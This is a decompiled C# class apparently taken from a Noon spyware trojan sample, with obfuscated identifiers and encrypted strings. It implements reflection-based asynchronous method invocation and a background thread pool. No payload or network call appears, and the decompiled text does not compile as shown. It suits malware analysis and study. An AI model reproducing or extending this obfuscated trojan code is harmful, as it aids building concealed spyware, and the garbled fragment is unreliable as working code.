// Decompiled with JetBrains decompiler
// Type: 8+Tx-//.TN+L1GZ
// Assembly: ;8w1LFr, Version=5.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35
// MVID: 2CC07ADF-5A94-44BC-9C37-07435DAD286F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.Win32.Noon.pef-7dfe305f31c1f571790f54c3522eb8c6066453e69a429782ebfc0d6f68b2ae34.exe

using \u002F2hTKun;
using \u0038\u002BTx\u002D\u002F\u002F;
using \u003B8w1LFr;
using \u005E78a\u002A\u003A5;
using QseP\u00218U;
using System;
using System.Collections;
using System.Globalization;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;

namespace \u0038\u002BTx\u002D\u002F\u002F
{
  internal class TN\u002BL1GZ : IAsyncResult
  {
    private readonly object \u003F\u002A\u002AVP8Z;
    private readonly string XHZthIQ;
    private readonly MethodInfo \u002D1VGyM\u0040;
    private readonly object[] saVz_\u0026A;
    private readonly AsyncCallback LVgana2;
    private readonly object vUdBP_V;
    private readonly ManualResetEvent \u00210Hf\u003A1Y = new ManualResetEvent(false);
    private Thread e4\u003FQ\u002Bu0;
    private object n\u002BN\u002Ff7x;
    private Exception je3m\u003B\u0023p;
    private int AUQ0T\u007E\u003F;
    private int \u0026Xu\u00244RR;

    public TN\u002BL1GZ(
      object target,
      MethodInfo method,
      AsyncCallback callback,
      object state,
      params object[] parameters)
    {
      this.XHZthIQ = method.Name;
      this.\u002D1VGyM\u0040 = method;
      this.\u003F\u002A\u002AVP8Z = target;
      this.LVgana2 = callback;
      this.vUdBP_V = state;
      this.saVz_\u0026A = parameters;
      if (this.\u002D1VGyM\u0040.GetParameters().Length != this.saVz_\u0026A.Length)
        throw new NotSupportedException(string.Format((IFormatProvider) CultureInfo.InvariantCulture, sgxPeiI.LiHKl\u0027x("*\a\u0019}/?<3\u0015y\u00017\u0001-,\ri!1\b\u0017\f\u0005\u0001? ;p+Z7\u000F*U&7\fh:>\t\u0016_\u0004\u001Dk+5xg\u0001i\u001Dj", "WAP7kr4oRqHlPkgM3fwOJ"), new object[1]
        {
          (object) this.XHZthIQ
        }));
    }

    public void \u002Bx8wLoO() => this.e4\u003FQ\u002Bu0 = rrcp5ES.\u002Ags\u002A\u003Frt.Zx\u005EkmRz(new ThreadStart(this.Vt\u0023\u002Fod4));

    private void Vt\u0023\u002Fod4()
    {
      try
      {
        this.n\u002BN\u002Ff7x = this.\u002D1VGyM\u0040.Invoke(this.\u003F\u002A\u002AVP8Z, this.saVz_\u0026A);
      }
      catch (Exception ex)
      {
        if (ex is TargetInvocationException && ex.InnerException != null)
          this.je3m\u003B\u0023p = ex.InnerException;
        else
          this.je3m\u003B\u0023p = ex;
      }
      finally
      {
        Interlocked.Exchange(ref this.AUQ0T\u007E\u003F, 1);
        this.\u00210Hf\u003A1Y.Set();
        if (this.LVgana2 != null)
          this.LVgana2((IAsyncResult) this);
      }
    }

    public object Y\u003AK\u002D\u002B3\u003F(object _param1, MethodInfo _param2)
    {
      if (this.\u002D1VGyM\u0040.Name != _param2.Name || this.\u002D1VGyM\u0040.ReturnType != _param2.ReturnType || this.\u003F\u002A\u002AVP8Z != _param1)
        throw new ArgumentException(string.Format((IFormatProvider) CultureInfo.InvariantCulture, sgxPeiI.LiHKl\u0027x("+\u0001\u001D?\n\u001Bo>\u0014:2!\v6#\u0011;!=\r\a\u001C\u001DXl6*l+\u0013<\u0004d\f,o u*$W\u001F_\u001E\u0019lc4s3Z+\u00050\r1!\0\u007Fn9\u0015\r\u0012I\fw&z\u007F(\b+\u00057\b,!\u0001r 8G \u001A\u000E\u0011q8jag\u0017<\u0014,\u0017'o\nun+\u000F\v\fI\u001Bs\")oi", "WAP7kr4oRqHlPkgM3fwOJ"), new object[1]
        {
          (object) _param2.Name
        }));
      return this.X\u003A\u0021Zv\u002Bv();
    }

    public object l7X\u0029l\u002FT(object _param1) => this.X\u003A\u0021Zv\u002Bv();

    public object X\u003A\u0021Zv\u002Bv()
    {
      if (Interlocked.Exchange(ref this.\u0026Xu\u00244RR, 1) != 0)
        throw new InvalidOperationException(string.Format((IFormatProvider) CultureInfo.InvariantCulture, sgxPeiI.LiHKl\u0027x(":\a\u001Cds'<$\u001B7@+\u0016/6Ey+\u007F\u0004\u0003\u0013\u0005\u001D{c5r$\u001Fy\u0006+\nc*\u0004x&\u007F\u0006\u0011\u0006\a\u001Bw15r(\u000F*@+\b&=\u0004o'0\tL", "WAP7kr4oRqHlPkgM3fwOJ"), new object[1]
        {
          (object) this.XHZthIQ
        }));
      this.\u00210Hf\u003A1Y.WaitOne();
      this.\u00210Hf\u003A1Y.Close();
      return this.je3m\u003B\u0023p != null ? (object) this.je3m\u003B\u0023p : this.n\u002BN\u002Ff7x;
    }

    internal string ApVPooI => this.XHZthIQ;

    public object H\u0025X99lY => this.vUdBP_V;

    public WaitHandle z\u002AO\u003A\u002AGB => (WaitHandle) this.\u00210Hf\u003A1Y;

    public bool qN\u0040\u003Fs\u0027s => false;

    public bool \u0030\u003F\u002Fv9\u002BG => Interlocked.CompareExchange(ref this.AUQ0T\u007E\u003F, 0, 0) != 0;

    public Thread X\u0026j\u002Ajxq => this.e4\u003FQ\u002Bu0;

    [CompilerGenerated]
    [SpecialName]
    public void add_TransferProgress(\u0023\u003F\u0029HSk\u007E value)
    {
      // ISSUE: reference to a compiler-generated field
      \u0023\u003F\u0029HSk\u007E hsk = ((s\u002B\u00274CeB) this).\u0038qRe\u0024\u0029l;
      \u0023\u003F\u0029HSk\u007E comparand;
      do
      {
        comparand = hsk;
        // ISSUE: reference to a compiler-generated field
        hsk = Interlocked.CompareExchange<\u0023\u003F\u0029HSk\u007E>(ref ((s\u002B\u00274CeB) this).\u0038qRe\u0024\u0029l, comparand + value, comparand);
      }
      while (hsk != comparand);
    }

    private class WMp\u00292jQ
    {
      private static readonly object qq\u005E9weC = new object();
      private static readonly ArrayList C\u002B\u0040iv2u = new ArrayList();

      private static void ax0UK\u002F\u002B()
      {
        TN\u002BL1GZ.WMp\u00292jQ.\u005E\u002Fs\u007E\u0029GG sGg = (TN\u002BL1GZ.WMp\u00292jQ.\u005E\u002Fs\u007E\u0029GG) null;
        for (int index = 0; index < TN\u002BL1GZ.WMp\u00292jQ.C\u002B\u0040iv2u.Count; ++index)
        {
          sGg = (TN\u002BL1GZ.WMp\u00292jQ.\u005E\u002Fs\u007E\u0029GG) TN\u002BL1GZ.WMp\u00292jQ.C\u002B\u0040iv2u[index];
          if (sGg.\u0021N\u0023VJ82 != Thread.CurrentThread)
            sGg = (TN\u002BL1GZ.WMp\u00292jQ.\u005E\u002Fs\u007E\u0029GG) null;
          else
            break;
        }
        if (sGg == null)
          return;
        while (true)
        {
          sGg.r\u003B3z\u002Bg\u002B.WaitOne(30000, false);
          ThreadStart mQbC;
          lock (TN\u002BL1GZ.WMp\u00292jQ.qq\u005E9weC)
          {
            mQbC = sGg.m\u0025qb\u007E\u0021c;
            if (mQbC == null)
            {
              sGg.r\u003B3z\u002Bg\u002B.Close();
              TN\u002BL1GZ.WMp\u00292jQ.C\u002B\u0040iv2u.Remove((object) sGg);
              break;
            }
          }
          mQbC();
          lock (TN\u002BL1GZ.WMp\u00292jQ.qq\u005E9weC)
          {
            sGg.m\u0025qb\u007E\u0021c = (ThreadStart) null;
            sGg.r\u003B3z\u002Bg\u002B.Reset();
          }
        }
      }

      public WMp\u00292jQ()
      {
      }

      public WMp\u00292jQ()
      {
        ((TN\u002BL1GZ.WMp\u00292jQ.\u005E\u002Fs\u007E\u0029GG) this).\u0021N\u0023VJ82 = new Thread(new ThreadStart(TN\u002BL1GZ.WMp\u00292jQ.ax0UK\u002F\u002B));
        ((TN\u002BL1GZ.WMp\u00292jQ.\u005E\u002Fs\u007E\u0029GG) this).r\u003B3z\u002Bg\u002B = new ManualResetEvent(false);
        ((TN\u002BL1GZ.WMp\u00292jQ.\u005E\u002Fs\u007E\u0029GG) this).\u0021N\u0023VJ82.IsBackground = true;
        ((TN\u002BL1GZ.WMp\u00292jQ.\u005E\u002Fs\u007E\u0029GG) this).\u0021N\u0023VJ82.Name = sgxPeiI.LiHKl\u0027x(">\u001A\u0001q 2n(\u00146\u00157X.*\u0011s!;G\u0010\n\a\u0016z1t", "WAP7kr4oRqHlPkgM3fwOJ");
      }

      private class \u005E\u002Fs\u007E\u0029GG
      {
        public readonly Thread \u0021N\u0023VJ82;
        public ThreadStart m\u0025qb\u007E\u0021c;
        public readonly ManualResetEvent r\u003B3z\u002Bg\u002B;
      }
    }
  }
}
